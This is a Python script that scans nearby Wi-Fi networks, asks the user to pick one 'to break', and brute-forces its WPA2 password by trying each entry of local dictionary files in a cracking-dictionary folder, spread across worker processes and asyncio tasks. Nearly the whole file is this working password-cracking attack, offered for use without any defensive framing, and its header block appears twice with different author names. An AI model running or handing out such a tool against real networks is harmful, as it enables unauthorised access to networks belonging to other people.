#!/usr/bin/env python
# -*- coding:utf-8 -*-
#@Time  : 2020/2/3 17:16
#@Author: yangjian
#@File  : wifi_connect.py#!/usr/bin/env python
# -*- coding:utf-8 -*-
#@Time  : 2020/2/3 17:16
#@Author: shawnjoe
#@File  : wifi_connect.py

'''
使用网卡扫描附近的wifi，选择指定wifi进行破解
在程序入口创建多进程，通过分配txt文件来作为进程任务
在每个进程中运行main（）：在函数中读取每个文本中的密码构建list，作为任务传给协程
使用生成器构造网络连接的函数test_connect()
'''
import time
from multiprocessing import Pool
import asyncio
import threading
# For mocking
import os
import pywifi
from pywifi import const

#pywifi.set_loglevel(logging.INFO)

def test_scan():

    wifi = pywifi.PyWiFi()#实例化，初始化
    iface = wifi.interfaces()[0]#第一个无线网卡
    iface.scan()#开始扫描
    time.sleep(3)
    bsses = iface.scan_results()#扫描结果
    return  bsses


@asyncio.coroutine
def test_connect(ssid,passwd):

    wifi = pywifi.PyWiFi()
    # print('threading %s' % threading.current_thread().name)
    print('正在尝试连接。。。。%s' % passwd)
    iface = wifi.interfaces()[0]
    iface.disconnect()
    yield from asyncio.sleep(1)

    if iface.status() not in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
        print('false')

    profile = pywifi.Profile() #构造wifi的profile
    profile.ssid = ssid #wifi名称
    profile.auth = const.AUTH_ALG_OPEN  #开放
    profile.akm.append(const.AKM_TYPE_WPA2PSK) #加密算法
    profile.cipher = const.CIPHER_TYPE_CCMP #wifi的数据类型
    profile.key = passwd #wifi密码
    #iface.remove_all_network_profiles() #卸载当前所有wifi
    tmp_profile = iface.add_network_profile(profile) #增加一个wifi
    iface.connect(tmp_profile) #根据profile连接wifi
    yield from asyncio.sleep(10)

    if iface.status() == const.IFACE_CONNECTED: #连接上的状态
        print("[+]连接成功 passwd：%s" % passwd)
        return True

    iface.disconnect() #首先断开所有连接
    yield from asyncio.sleep(1)

    if iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:#wifi未连接上，网卡未激活
        print("[-]连接失败 passwd %s " % passwd)
        return False

def main(wifi_name, dic):

    print('%s is breaking' % wifi_name)
    print('childeren process %s' % os.getpid())
    path = 'E:\\python_station\\破解字典\\' + dic

    # 将密码批量读出，并且以换行符为分割
    with open(path,'r') as f:
        txt = f.read().split()

    loop = asyncio.get_event_loop()
    tasks = [test_connect(wifi_name,passwd) for passwd in txt]
    # tasks = [test_connect(wifi_name,passwd) for passwd in ['23423','4324','smile100%']]
    loop.run_until_complete(asyncio.wait(tasks))
    loop.close()


if __name__ == '__main__':

    bsses = test_scan()
    n = 0

    for wifi in bsses:
        print("wifi %s : %s" % (n, wifi.ssid))
        n = n + 1

    #选择wifi的序号
    num = int(input('Please choose the wifi you wanna break: '))
    wifi_name = bsses[num].ssid
    txt_files = [x for x in os.listdir('E:\\python_station\\破解字典') if os.path.splitext(x)[1] == '.txt']
    p = Pool(8)

    #创建多进程，并根据破解任务量投放任务
    for i in range(len(txt_files)):
        p.apply_async(main, args=(wifi_name, txt_files[i], ))

    print('wait')
    p.close()
    p.join()